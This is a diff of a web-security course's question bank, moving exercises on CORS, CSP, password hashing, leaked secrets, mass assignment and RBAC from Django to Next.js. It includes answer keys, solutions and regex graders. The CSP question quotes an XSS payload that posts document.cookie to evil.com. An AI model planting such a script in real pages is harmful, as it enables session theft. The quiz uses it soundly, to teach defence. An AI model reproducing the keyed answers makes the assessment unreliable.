+Read the origin from the request's Origin header.`,
+    starterCode: `// app/api/profile/route.ts
 `,
     testCases: [
-      {
-        input: 'CORS configuration for credentials',
-        expectedOutput: 'CORS_ALLOW_CREDENTIALS = True with CORS_ALLOWED_ORIGINS list',
-        description: 'Should set CORS_ALLOW_CREDENTIALS with specific origins (not wildcard)',
-      },
-      {
-        input: 'Allowed headers and methods',
-        expectedOutput: 'CORS_ALLOW_HEADERS includes content-type, authorization; CORS_ALLOW_METHODS includes GET, POST, PUT, DELETE, OPTIONS',
-        description: 'Should configure allowed headers and methods for preflight',
-      },
+      { input: 'OPTIONS with Origin: https://myapp.com', expectedOutput: '204, Access-Control-Allow-Origin: https://myapp.com, Access-Control-Allow-Credentials: true', description: 'The preflight from an allowed origin succeeds with credentials allowed' },
+      { input: 'GET with Origin: https://evil.example', expectedOutput: 'no Access-Control-* headers', description: 'Other origins get no CORS headers' },
+      { input: 'any response', expectedOutput: 'never Access-Control-Allow-Origin: *', description: 'A credentialed response names the exact origin, never the * wildcard' },
     ],
-    solution: `# settings.py
-import os
+    solution: `// app/api/profile/route.ts
+const allowedOrigins = ["https://myapp.com", "http://localhost:3000"];
 
-INSTALLED_APPS = [
-    # ... other apps ...
-    'corsheaders',
-    # ...
-]
+function corsHeaders(origin: string | null): Record<string, string> {
+  if (!origin || !allowedOrigins.includes(origin)) return {};
+  return {
+    "Access-Control-Allow-Origin": origin,
+    "Access-Control-Allow-Credentials": "true",
+    "Access-Control-Allow-Methods": "GET, PATCH, OPTIONS",
+    "Access-Control-Allow-Headers": "Content-Type",
+    Vary: "Origin",
+  };
+}
 
-MIDDLEWARE = [
-    'corsheaders.middleware.CorsMiddleware',  # Must be FIRST (before CommonMiddleware)
-    'django.middleware.common.CommonMiddleware',
-    # ... other middleware ...
-]
+export async function OPTIONS(req: Request) {
+  return new Response(null, { status: 204, headers: corsHeaders(req.headers.get("origin")) });
+}
 
-# CORS Configuration
-CORS_ALLOWED_ORIGINS = [
-    'http://localhost:3000',        # Next.js dev server
-    'https://myapp.com',            # Production frontend
-    'https://www.myapp.com',        # Production with www
-]
-
-# Allow cookies and auth headers to be sent cross-origin
-CORS_ALLOW_CREDENTIALS = True
-
-# Headers the frontend is allowed to send
-CORS_ALLOW_HEADERS = [
-    'accept',
-    'accept-encoding',
-    'authorization',
-    'content-type',
-    'dnt',
-    'origin',
-    'user-agent',
-    'x-csrftoken',
-    'x-requested-with',
-]
-
-# HTTP methods allowed for cross-origin requests
-CORS_ALLOW_METHODS = [
-    'DELETE',
-    'GET',
-    'OPTIONS',
-    'PATCH',
-    'POST',
-    'PUT',
-]`,
-    explanation: 'CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks frontend JavaScript from making requests to a different domain unless the server explicitly allows it. When your Next.js app (localhost:3000) calls your Django API (localhost:8000), the browser sends a preflight OPTIONS request first, asking "is this allowed?" The server responds with Access-Control-Allow-Origin, Access-Control-Allow-Methods, etc. Key gotcha: Access-Control-Allow-Origin: * (wildcard) does NOT work with Access-Control-Allow-Credentials: true. The browser spec requires a specific origin when credentials are involved. This prevents a malicious site from making authenticated requests to your API and reading the response. CorsMiddleware MUST come before CommonMiddleware so it can handle the preflight OPTIONS request before Django rejects it. The x-csrftoken header is needed if you use Django\'s CSRF protection with cross-origin requests.',
+export async function GET(req: Request) {
+  return Response.json({ ok: true }, { headers: corsHeaders(req.headers.get("origin")) });
+}`,
+    explanation: `CORS is the browser asking the server whether a page from another origin may read its responses. Because this fetch sends credentials (the cookie), and a PATCH or a JSON Content-Type is not a simple request, the browser first sends an OPTIONS preflight; the OPTIONS handler answers it with 204 and the CORS headers, and only then is the real request sent. With credentials, the browser rejects Access-Control-Allow-Origin: *: the server must name the exact origin and send Access-Control-Allow-Credentials: true, otherwise any site could make logged-in requests and read the answers. Echoing the Origin header only after checking it against the allow-list does that safely, and Vary: Origin tells caches the response differs per origin. CORS protects reading responses in the browser, not the server: requests from curl or a script are not affected, so the route still checks the session itself. The cookie also needs SameSite=None; Secure to be sent cross-site at all. In Express or Django the same headers come from the cors or django-cors-headers package.`,
     tieredHints: {
-      apiSignature: 'CORS_ALLOWED_ORIGINS: List[str]; CORS_ALLOW_CREDENTIALS: bool',
-      skeleton: `MIDDLEWARE = [
-    'corsheaders.middleware.CorsMiddleware',
-    'django.middleware.common.CommonMiddleware',
-]
+      apiSignature: 'new Response(body, { status, headers }); req.headers.get("origin"): string | null',
+      skeleton: `// in corsHeaders(origin)
+if (!origin || !allowedOrigins.____(origin)) return {};
+return {
+  "Access-Control-Allow-Origin": ____,
+  "Access-Control-Allow-Credentials": ____,
+  // ...methods, headers, Vary
+};
 
-CORS_ALLOWED_ORIGINS = [
-    'http://localhost:3000',
-    'https://myapp.com',
-]
-
-CORS_ALLOW_CREDENTIALS = ____
-CORS_ALLOW_HEADERS = ['____', 'authorization', 'content-type']
-CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
+// the preflight handler
+export async function ____(req: Request) {
+  return new Response(____, { status: ____, headers: ____ });
+}`,
     },
     hints: [
-      'CORS_ALLOW_ALL_ORIGINS = True won\'t work with CORS_ALLOW_CREDENTIALS = True',
-      'CorsMiddleware must be placed before CommonMiddleware in MIDDLEWARE',
-      'Include x-csrftoken in allowed headers for Django CSRF compatibility',
+      'With credentials, Access-Control-Allow-Origin must be the exact origin, never *',
+      'Check the request\'s Origin against the allow-list before echoing it',
+      'The preflight is an OPTIONS request that needs its own handler',
     ],
-    tags: ['cors', 'django', 'preflight', 'credentials', 'security'],
-    concepts: ['web-security-cors', 'web-security-input-validation'],
+    tags: [
+      'cors',
+      'nextjs',
+      'route-handler',
+      'preflight',
+      'credentials',
+      'security',
+    ],
+    concepts: [
+      'web-security-cors',
+    ],
+    requires: [
+      /^(?![\s\S]*Allow-Origin["']?\s*[:,]\s*["']\*)/,
+      /\.(includes|has)\(\s*origin\s*\)/,
+      /Allow-Origin["']?\s*:\s*origin\b/,
+      /Allow-Credentials["']?\s*:\s*["']true["']/,
+      /export\s+(async\s+)?(function\s+|const\s+)OPTIONS\b/,
+      /status:\s*204/,
+    ],
   },
 
   {
@@ -712,17 +698,25 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.ADVANCED,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    question: 'An attacker finds a Stored XSS vulnerability in your app\'s comment section. They inject: <script>fetch("https://evil.com/steal", {body: document.cookie})</script>\n\nBut the attack fails because your server sends this header:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'; connect-src \'self\' https://api.myapp.com\n\nWhy did CSP block the attack even though the script was successfully injected into the HTML?',
+    question: `An attacker finds a stored XSS hole in your comment section and saves this comment:
+
+<script>fetch("https://evil.com/steal", { method: "POST", body: document.cookie })</script>
+
+The attack fails, because your pages are served with this header:
+
+Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://api.myapp.com
+
+Why did CSP stop the attack, even though the script tag made it into the HTML?`,
     options: [
-      { id: 'a', text: 'CSP blocked it twice: (1) script-src \'self\' blocks inline scripts -- the injected <script> tag won\'t execute because only scripts loaded from your own domain are allowed. (2) connect-src limits fetch/XHR destinations -- even if the script ran, fetch to evil.com would be blocked. CSP acts as a safety net that prevents XSS damage even when injection occurs.', isCorrect: true },
-      { id: 'b', text: 'CSP encrypts all script tags so injected code can\'t be parsed by the browser. The default-src \'self\' directive encrypts the page content.', isCorrect: false },
-      { id: 'c', text: 'CSP only blocks scripts from third-party CDNs. The injected script was blocked because it tried to load an external resource, not because it was inline.', isCorrect: false },
-      { id: 'd', text: 'CSP didn\'t actually block the attack. The fetch failed because of CORS -- evil.com didn\'t have Access-Control-Allow-Origin for your domain.', isCorrect: false },
+      { id: 'a', text: 'script-src \'self\' refuses to run inline scripts, and connect-src would also have blocked the fetch to evil.com', isCorrect: true },
+      { id: 'b', text: 'default-src \'self\' makes the browser escape every tag the server sends, so the script arrived as plain text', isCorrect: false },
+      { id: 'c', text: 'CSP blocks only scripts loaded from other domains, and it stopped this one because the fetch URL is on evil.com', isCorrect: false },
+      { id: 'd', text: 'CSP did nothing here: the fetch failed because evil.com sends no Access-Control-Allow-Origin header for your site', isCorrect: false },
     ],
-    explanation: 'Content Security Policy is a powerful HTTP header that tells the browser exactly which resources are allowed to load and execute on your page. script-src \'self\' means: only execute JavaScript files loaded from your own domain. This blocks: (1) Inline <script> tags (unless you add \'unsafe-inline\', which you should avoid). (2) Scripts loaded from other domains. (3) Event handlers like onclick="...". connect-src restricts where fetch(), XMLHttpRequest, and WebSocket can connect. Even if an attacker bypasses script-src (e.g., via a script gadget), connect-src prevents data exfiltration. CSP is defense-in-depth: it doesn\'t prevent XSS injection, but it prevents the injected code from doing damage. You can also use report-uri to get notified when CSP blocks something, helping you detect attacks. To allow specific inline scripts, use nonces (script-src \'nonce-abc123\') rather than \'unsafe-inline\'.',
+    explanation: `Content Security Policy tells the browser which sources may run scripts and receive requests on your page. script-src 'self' allows only script files loaded from your own origin, so inline <script> blocks and inline event handlers such as onclick="..." do not run (unless you add 'unsafe-inline', which you should avoid; use a nonce or hash for the inline scripts you really need). connect-src lists where fetch, XMLHttpRequest and WebSocket may connect, so even if a script did run, its fetch to evil.com would be refused: a second line of defence. CSP does not escape or rewrite your HTML; the tag is still in the page, it just does not execute. CORS would not have saved you: it stops a page reading a cross-origin response, not sending the request, so without CSP the cookie would already have reached evil.com. A report-to directive tells you when CSP blocks something, which helps you find the injection hole.`,
     hints: [
-      'script-src \'self\' blocks ALL inline scripts, not just ones from external sources',
-      'connect-src limits where fetch() and XMLHttpRequest can send data',
+      'script-src \'self\' blocks inline scripts as well as scripts from other domains',
+      'connect-src limits where fetch() can send data',
     ],
     tags: ['csp', 'content-security-policy', 'xss-defense', 'security-headers'],
     concepts: ['web-security-xss'],
@@ -738,17 +732,17 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'Your database is breached and the users table is leaked. Which scenario results in the LEAST damage to your users, and why?',
+    question: `Your database is breached and the users table leaks. Which way of storing the passwords does the least damage to your users, and why?`,
     options: [
-      { id: 'a', text: 'Passwords hashed with SHA256. SHA256 is cryptographically secure and used in Bitcoin, so it\'s the strongest option. Salts are optional but nice to have.', isCorrect: false },
-      { id: 'b', text: 'Passwords hashed with bcrypt or argon2 (with unique salts). These algorithms are intentionally SLOW (bcrypt does thousands of rounds of computation per hash). An attacker trying 10 billion SHA256 hashes/second might only manage 10,000 bcrypt hashes/second. The salt (random value added per-password) means pre-computed rainbow tables are useless -- each password must be cracked individually.', isCorrect: true },
-      { id: 'c', text: 'Passwords encrypted with AES-256. Encryption is stronger than hashing because you can decrypt and verify. As long as the encryption key wasn\'t in the same database, the passwords are safe.', isCorrect: false },
-      { id: 'd', text: 'Passwords stored in Base64. Base64 isn\'t human-readable so it provides a layer of security. Attackers would need special tools to decode it.', isCorrect: false },
+      { id: 'a', text: 'SHA-256 hashes: the algorithm is cryptographically secure and used by Bitcoin, so a salt is only a nice extra', isCorrect: false },
+      { id: 'b', text: 'bcrypt or Argon2 with a unique salt per password: slow by design, and salts make precomputed tables useless', isCorrect: true },
+      { id: 'c', text: 'AES-256 encryption: unlike a hash it can be decrypted to check a login, and the key is kept outside the table', isCorrect: false },
+      { id: 'd', text: 'Base64 encoding: the stored values are not human-readable, so an attacker needs special tools to decode them', isCorrect: false },
     ],
-    explanation: 'Hashing vs Encryption: Hashing is ONE-WAY (you can\'t reverse a hash to get the password). Encryption is TWO-WAY (if the attacker finds the key, they decrypt everything). For passwords, you want ONE-WAY. SHA256 is fast by design -- it\'s meant for verifying file integrity, not passwords. GPUs can compute billions of SHA256 hashes per second, meaning an attacker can brute-force common passwords in minutes. bcrypt/argon2 are deliberately slow: bcrypt uses a configurable "work factor" (each increase doubles the time), and argon2 also uses configurable memory, making GPU attacks harder. Salt: a random value concatenated with the password before hashing. Without salt, identical passwords produce identical hashes, and attackers can use rainbow tables (pre-computed hash databases). With salt, each password hash is unique even if two users have the same password. Django uses PBKDF2 by default (also slow, configurable iterations) and stores the salt alongside the hash.',
+    explanation: `Passwords should be hashed, which is one-way, with an algorithm that is slow on purpose. SHA-256 is designed to be fast, for checking files; a GPU computes billions of SHA-256 hashes a second, so common passwords fall in minutes. bcrypt has a work factor (each step up doubles the time per guess) and Argon2id also needs a configurable amount of memory, which makes GPU attacks far more expensive; OWASP recommends Argon2id, with bcrypt still widely used (bcryptjs in the Auth.js credentials setup earlier in the course). A salt is a random value stored with each hash and mixed in before hashing, so two users with the same password get different hashes and precomputed rainbow tables are useless. Encryption is two-way: anyone who finds the key, often on the same server, decrypts every password at once. Base64 is an encoding, not protection; anyone can decode it in one line.`,
     hints: [
-      'The goal is to make brute-force attacks as expensive as possible',
-      'Fast hashing algorithms (SHA256, MD5) are bad for passwords BECAUSE they are fast',
+      'The goal is to make each guess as expensive as possible for the attacker',
+      'Fast hashing algorithms such as SHA-256 and MD5 are bad for passwords because they are fast',
     ],
     tags: ['password-hashing', 'bcrypt', 'argon2', 'salt', 'security'],
     concepts: ['web-security-input-validation'],
@@ -760,17 +754,23 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'During a code review, you notice a teammate committed a .env file containing:\nDATABASE_URL=postgres://admin:secretpass@db.example.com/prod\nDJANGO_SECRET_KEY=abc123supersecret\nNEXT_PUBLIC_API_URL=https://api.myapp.com\n\nThey deleted the file and made a new commit. What are the problems here, and which variable is safe to expose?',
+    question: `In a code review you notice a teammate committed a .env file containing:
+
+DATABASE_URL=postgres://admin:secretpass@db.example.com/prod
+AUTH_SECRET=abc123supersecret
+NEXT_PUBLIC_API_URL=https://api.myapp.com
+
+They then deleted the file in a new commit. What is still wrong, and which of the three values was safe to expose?`,
     options: [
-      { id: 'a', text: 'Deleting the file and committing removes it from the repository. The secrets are safe now. All three variables should be kept private -- NEXT_PUBLIC_ is just a naming convention.', isCorrect: false },
-      { id: 'b', text: 'Only DATABASE_URL is a problem. DJANGO_SECRET_KEY is just for CSRF tokens and isn\'t a real security concern. NEXT_PUBLIC_ variables are encrypted in the client bundle.', isCorrect: false },
-      { id: 'c', text: 'Deleting the file doesn\'t help -- secrets are still in git history and must be rotated immediately. DATABASE_URL and DJANGO_SECRET_KEY are compromised. NEXT_PUBLIC_API_URL is the only safe one -- Next.js\'s NEXT_PUBLIC_ prefix means it\'s intentionally exposed to the client bundle. You must: rotate the database password, generate a new SECRET_KEY, use tools like git filter-branch or BFG to purge history.', isCorrect: true },
-      { id: 'd', text: 'This is fine for development environments. .env files are only dangerous if they contain production credentials. Git history only goes back 30 days before being garbage collected.', isCorrect: false },
+      { id: 'a', text: 'Nothing now: the delete commit removed the file, and NEXT_PUBLIC_ is just a naming style, so treat all three as secret', isCorrect: false },
+      { id: 'b', text: 'Only DATABASE_URL matters: AUTH_SECRET just names the app, and NEXT_PUBLIC_ values are encrypted in the browser bundle', isCorrect: false },
+      { id: 'c', text: 'The secrets are still in git history, so rotate the database password and AUTH_SECRET; NEXT_PUBLIC_API_URL is public anyway', isCorrect: true },
+      { id: 'd', text: 'Nothing yet: git keeps a deleted file only until its 30-day garbage collection runs, which then removes it for good', isCorrect: false },
     ],
-    explanation: 'Git never forgets: every commit is permanent in git history. Running `git log --all -p` or using tools like truffleHog can find every secret ever committed. Deleting a file only removes it from the current tree, not from history. Fix: (1) Rotate ALL compromised secrets immediately (new database password, new Django SECRET_KEY). (2) Use BFG Repo-Cleaner or git filter-repo to purge the file from all history. (3) Force-push the cleaned history. (4) Add .env to .gitignore. NEXT_PUBLIC_ prefix: In Next.js, environment variables prefixed with NEXT_PUBLIC_ are inlined into the JavaScript bundle at build time and sent to the browser. This is by design for non-sensitive values like public API URLs. DJANGO_SECRET_KEY is critical -- it\'s used for: signing session cookies, CSRF tokens, password reset tokens, and any cryptographic signing. If leaked, an attacker can forge sessions and impersonate any user. For production, use your hosting platform\'s secret management (Vercel env vars, AWS Secrets Manager, etc.).',
+    explanation: `Git keeps every committed version, so deleting the file only removes it from the latest commit; \`git log --all -p\` or a secret scanner such as truffleHog finds it in history, and every clone already has it. Treat both secrets as leaked: rotate the database password and generate a new AUTH_SECRET (Auth.js signs and encrypts session tokens with it, so a leaked secret lets an attacker forge a session for any user; rotating it signs everyone out). Then purge the file from history with git filter-repo or BFG and force-push, add .env to .gitignore, and keep production secrets in your host's environment settings. NEXT_PUBLIC_API_URL was never secret: Next.js inlines every NEXT_PUBLIC_ variable into the JavaScript bundle at build time, in plain text, which is why only values meant for the browser get that prefix. Git's garbage collection removes only unreachable objects, never committed history.`,
     hints: [
-      'Git stores the full history of every file -- deleting a file doesn\'t remove it from past commits',
-      'NEXT_PUBLIC_ is a Next.js convention that intentionally exposes variables to the client',
+      'Deleting a file does not remove it from earlier commits',
+      'NEXT_PUBLIC_ is a Next.js convention that deliberately ships a value to the browser',
     ],
     tags: ['secrets', 'env-files', 'git-security', 'secret-rotation', 'security'],
     concepts: ['web-security-input-validation'],
@@ -782,17 +782,22 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.BEGINNER,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'A junior developer argues: "We already validate the email format in our React form with Zod before submission. Why do we need to validate again in our Django serializer?" What is the correct response?',
+    question: `A profile page sends PATCH /api/profile with { displayName, bio }. The route handler runs:
+
+const body = await req.json();
+await prisma.user.update({ where: { id: session.user.id }, data: body });
+
+The User model also has a role column. An attacker sends { "displayName": "x", "role": "ADMIN" } straight to the API. What is the problem, and what is the fix?`,
     options: [
-      { id: 'a', text: 'They\'re right. Validating twice is redundant and slows down the application. If the frontend validates with Zod, the data is guaranteed to be correct by the time it reaches Django.', isCorrect: false },
-      { id: 'b', text: 'You only need server-side validation. Client-side validation is a waste of time because the server will catch errors anyway.', isCorrect: false },
-      { id: 'c', text: 'Client-side validation is more secure because it runs in the user\'s browser, which is a trusted environment. Server validation is just a backup.', isCorrect: false },
-      { id: 'd', text: 'Client-side validation can be completely bypassed -- an attacker can send requests directly to your API using curl, Postman, or a script, skipping your React form entirely. Client validation improves UX (instant feedback), but server validation is the actual security boundary. Always validate on both: client for UX, server for security.', isCorrect: true },
+      { id: 'a', text: 'No problem: the form only has displayName and bio inputs, so no request can ever contain any other key', isCorrect: false },
+      { id: 'b', text: 'SQL injection: the JSON body reaches the database, so escape every value before passing it to Prisma', isCorrect: false },
+      { id: 'c', text: 'No problem: Prisma refuses to write columns that have a default value in the schema, and role has one', isCorrect: false },
+      { id: 'd', text: 'Mass assignment: every column in the body is written; parse it with a Zod object of only the allowed fields', isCorrect: true },
     ],
-    explanation: 'NEVER trust the client. Everything in the browser can be manipulated: JavaScript can be modified, network requests can be intercepted and replayed, and attackers can call your API directly without ever loading your frontend. An attacker can: (1) Open browser DevTools and modify the JavaScript. (2) Use curl/Postman to send arbitrary data to your API. (3) Use a proxy like Burp Suite to modify requests in transit. Client-side validation (React forms, Zod schemas) provides instant feedback and reduces unnecessary server requests -- great for UX. Server-side validation (Django serializers, form validators) is the actual security boundary that prevents malicious data from entering your system. Both are needed: client for a smooth user experience, server for actual security. In Django REST Framework, serializer field validations (e.g., EmailField, IntegerField, validate_ methods) handle this automatically.',
+    explanation: `Passing the request body straight into data writes whatever columns the client chooses, so anyone can send role, emailVerified or another user's fields. That is mass assignment, and the form's inputs do not limit it, because the attacker calls the API directly. Parse the body with a schema that lists only what this route may change, such as z.object({ displayName: z.string().max(50), bio: z.string().max(500) }); a Zod object drops keys it does not list by default (or use .strict() to reject the request instead), and pass the parsed result, not the raw body, to prisma.user.update. Picking the fields by hand ({ displayName: body.displayName, bio: body.bio }) also works. Prisma sends values as query parameters, so this is not SQL injection, and a column's default only applies when a row is created without it.`,
     hints: [
-      'Can you send an HTTP request to an API without using the website?',
-      'curl, Postman, and scripts can bypass all frontend validation',
+      'Which columns does prisma.user.update write when data is the whole request body?',
+      'Can the attacker add keys that the form never had?',
     ],
     tags: ['input-validation', 'client-server', 'zod', 'django-serializers', 'security'],
     concepts: ['web-security-input-validation', 'forms-zod-schema'],
@@ -804,17 +809,34 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'Your DRF API endpoint GET /api/users/me returns:\n{\n  "id": 1,\n  "username": "alice",\n  "email": "alice@example.com",\n  "password": "pbkdf2_sha256$260000$salt$hash",\n  "is_staff": true,\n  "is_superuser": false,\n  "last_login": "2024-01-15T10:30:00Z",\n  "social_security_number": "123-45-6789"\n}\n\nWhat is the security issue and how do you fix it in DRF?',
+    question: `Your route handler for GET /api/users/me runs
+
+const user = await prisma.user.findUnique({ where: { id: session.user.id } });
+return Response.json(user);
+
+and returns:
+
+{
+  "id": 1,
+  "username": "alice",
+  "email": "alice@example.com",
+  "passwordHash": "$2b$12$Qb3...",
+  "isAdmin": true,
+  "lastLogin": "2026-01-15T10:30:00Z",
+  "ssn": "123-45-6789"
+}
+
+What is the security issue, and how do you fix it?`,
     options: [
-      { id: 'a', text: 'Over-exposure of sensitive data. The API returns the password hash (which can be brute-forced offline), is_staff flag (reveals admin status to attackers), and SSN. Fix: explicitly list safe fields in your DRF serializer using the fields attribute (id, username, email only). Never use fields = "__all__" or exclude password alone. Use different serializers for different endpoints (list vs detail vs admin).', isCorrect: true },
-      { id: 'b', text: 'The only issue is the SSN field. Password hashes are safe to expose because they can\'t be reversed. is_staff and is_superuser are needed for frontend routing.', isCorrect: false },
-      { id: 'c', text: 'This is fine for an authenticated endpoint. Since the user is logged in, they should see all their own data. The frontend should just hide sensitive fields with CSS.', isCorrect: false },
-      { id: 'd', text: 'Add a password to the API endpoint so only authorized users can access it. The fields themselves are fine to return if the endpoint is protected.', isCorrect: false },
+      { id: 'a', text: 'It leaks the password hash, the admin flag and the SSN; choose the returned fields with select (id, username, email)', isCorrect: true },
+      { id: 'b', text: 'Only the SSN is a problem: password hashes cannot be reversed, and the front end needs isAdmin to choose pages', isCorrect: false },
+      { id: 'c', text: 'Nothing: the route needs a session and returns only the caller\'s own row, so every field in it is theirs to see', isCorrect: false },
+      { id: 'd', text: 'Delete the sensitive keys in the client component before rendering, so the browser never shows the hash or SSN', isCorrect: false },
     ],
-    explanation: 'Data exposure is a top OWASP vulnerability. Problems: (1) Password hash: While bcrypt/PBKDF2 are slow to crack, exposing the hash lets attackers attempt offline brute-force at their leisure. (2) is_staff/is_superuser: Tells attackers which accounts are worth targeting for privilege escalation. (3) SSN: Obvious PII that should never transit over an API. Fix in DRF: Use explicit serializer fields to whitelist exactly what gets sent: class UserSerializer(serializers.ModelSerializer): class Meta: model = User; fields = [\'id\', \'username\', \'email\']. NEVER use fields = \'__all__\' -- new model fields automatically become exposed. Use exclude cautiously (easy to forget new sensitive fields). For different access levels, create separate serializers: UserPublicSerializer (id, username), UserPrivateSerializer (adds email), UserAdminSerializer (adds is_staff, last_login). In Django ORM, use .values(\'id\', \'username\') or .only() to avoid even loading sensitive columns from the database.',
+    explanation: `Returning the whole row sends every column to the browser, including ones that must never leave the server. The password hash lets an attacker who gets hold of a response (a stolen session, a shared screen, a logged request) try passwords offline at leisure; isAdmin tells them which accounts are worth attacking; and the SSN is personal data that this screen does not need. The data is already in the network response, so deleting keys in the client hides nothing, and owning the row does not mean every column should travel. Fix: list exactly what the route returns, with select: { id: true, username: true, email: true }, or map the row to a response type. An allow-list keeps a column added later private by default; Prisma 6's omit option (per query or set globally for passwordHash) is a useful backstop, but a deny-list forgets new sensitive columns. Different screens can use different selects (a public profile, the user's own settings, an admin view).`,
     hints: [
-      'Even hashed passwords are valuable to attackers for offline cracking',
-      'Use explicit fields = [...] in serializers, never fields = "__all__"',
+      'Even a hashed password is valuable to an attacker for offline guessing',
+      'Which fields does this screen actually need?',
     ],
     tags: ['data-exposure', 'serializers', 'drf', 'owasp', 'security'],
     concepts: ['web-security-input-validation'],
@@ -830,16 +852,16 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.ADVANCED,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    question: 'An attacker targets your Next.js + Django application. They chain multiple small vulnerabilities: (1) They find a reflected XSS in a search page, (2) use it to steal a session cookie that lacks the httpOnly flag, (3) use the cookie to access an admin API endpoint that doesn\'t check user roles. No single vulnerability is critical, but combined they achieve full admin access.\n\nWhat security principle would have prevented this, and how?',
+    question: `An attacker chains three small weaknesses in your Next.js app: (1) a reflected XSS on the search page, (2) which steals a session cookie set without the httpOnly flag, (3) which they use to call an admin API route that never checks the user's role. No single weakness is critical, but together they give full admin access. Which security principle would have prevented this, and how?`,
     options: [
-      { id: 'a', text: 'Zero trust architecture. The fix is to require re-authentication for every single API call. This eliminates the need for session cookies entirely.', isCorrect: false },
-      { id: 'b', text: 'Defense in depth. If ANY single layer had held, the chain breaks: (1) CSP headers would block the XSS script execution. (2) httpOnly flag on cookies would prevent JavaScript from reading them. (3) RBAC on the admin endpoint would reject non-admin users. (4) Rate limiting would slow automated exploitation. Each layer assumes the others might fail. No single security measure is sufficient.', isCorrect: true },
-      { id: 'c', text: 'Security through obscurity. The attacker found the admin endpoint because it was at a predictable URL (/api/admin). Renaming it to a random URL would prevent discovery.', isCorrect: false },
-      { id: 'd', text: 'The principle of least privilege. The only fix needed is restricting the admin endpoint. The XSS and cookie issues are minor and don\'t need to be fixed if the endpoint is properly secured.', isCorrect: false },
+      { id: 'a', text: 'Zero trust: require a fresh login on every single API call, which removes session cookies and so the whole chain', isCorrect: false },
+      { id: 'b', text: 'Defense in depth: a CSP, an httpOnly cookie or a role check on the admin route would each have broken the chain', isCorrect: true },
+      { id: 'c', text: 'Security through obscurity: move the admin API from /api/admin to a random URL, so attackers cannot find it', isCorrect: false },
+      { id: 'd', text: 'Least privilege alone: lock down the admin route, after which the XSS and the cookie flags can be left as they are', isCorrect: false },
     ],
-    explanation: 'Defense in depth means implementing multiple overlapping security layers so that if one fails, others still protect the system. In this scenario, FOUR independent defenses could have stopped the attack: (1) Input sanitization + CSP headers prevent XSS from executing. (2) httpOnly + Secure + SameSite cookie flags prevent cookie theft via JavaScript. (3) Role-Based Access Control (RBAC) on endpoints ensures only admins can access admin APIs, regardless of how the request was authenticated. (4) Rate limiting and anomaly detection could flag unusual activity. Real-world attacks almost always chain multiple small vulnerabilities. That\'s why you implement ALL security layers, not just the ones that seem most important. This is why security reviews check for: HTTPS + auth + authorization + input validation + output encoding + security headers + rate limiting + logging + monitoring. Each layer is a link in a chain, and the chain is only as strong as its weakest link.',
+    explanation: `Defense in depth means several overlapping layers, each built on the assumption that the others might fail. This attack needed every link in its chain, so holding any one layer would have stopped it: a Content-Security-Policy (with escaped output) stops the injected script from running; an httpOnly cookie cannot be read by JavaScript at all, so there is nothing to steal; and a role check on the admin route (authorisation, not just authentication) rejects a non-admin session however it was obtained. Rate limiting and alerts on unusual admin activity add more layers. Fixing only the admin route leaves an XSS hole that can do other damage, a random URL is found by anyone who watches the traffic, and forcing a login on every call would make the app unusable without removing the XSS. Real breaches usually chain small weaknesses like these, which is why you close all of them.`,
     hints: [
-      'The attacker needed THREE vulnerabilities to succeed. Fixing any one would break the chain.',
+      'The attacker needed all three weaknesses; fixing any one breaks the chain',
       'Each security measure should assume the others might fail',
     ],
     tags: ['defense-in-depth', 'security-layers', 'attack-chains', 'architecture'],
@@ -852,98 +874,85 @@ CORS_ALLOW_METHODS = ['GET', 'POST', 'PUT', 'DELETE', '____']`,
     difficulty: Difficulty.BEGINNER,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    language: CodeLanguage.PYTHON,
-    question: 'Implement a DRF custom permission class for Role-Based Access Control (RBAC). Your User model has a role field with values: "admin", "editor", "viewer".\n\nRules:\n- Admin: Full access (GET, POST, PUT, DELETE)\n- Editor: Can read and create/update (GET, POST, PUT) but NOT delete\n- Viewer: Read-only (GET only)\n- Unauthenticated: No access\n\nCreate the permission class and show how to apply it to a ViewSet.',
-    starterCode: `from rest_framework.permissions import BasePermission
+    language: CodeLanguage.TYPESCRIPT,
+    question: `Users have one of three roles: "admin", "editor" or "viewer". In app/api/articles/[id]/route.ts write:
+1. ROLE_METHODS, a table of the HTTP methods each role may use: admin GET, PUT and DELETE; editor GET and PUT; viewer GET only
+2. can(role: Role, method: string): boolean, which looks the method up in that table
+3. a DELETE handler that reads the session with await auth(); answers 401 when there is no session; answers 403 when can(session.user.role, "DELETE") is false; and otherwise deletes the article with prisma.article.delete({ where: { id } }) and answers 204 with no body
 
-# TODO: Implement RoleBasedPermission
-# - Check if user is authenticated
-# - Check user.role against the HTTP method
-# - Admin: all methods
-# - Editor: GET, POST, PUT, PATCH, HEAD, OPTIONS
-# - Viewer: GET, HEAD, OPTIONS only
-class RoleBasedPermission(BasePermission):
-    pass
+auth comes from "@/auth" and prisma from "@/lib/prisma"; assume session.user.role is typed as Role. In Next.js 15 the route's params is a promise.`,
+    starterCode: `// app/api/articles/[id]/route.ts
+import { auth } from "@/auth";
+import { prisma } from "@/lib/prisma";
 
-
-# TODO: Apply to a ViewSet
-# from rest_framework import viewsets
-# from .models import Article
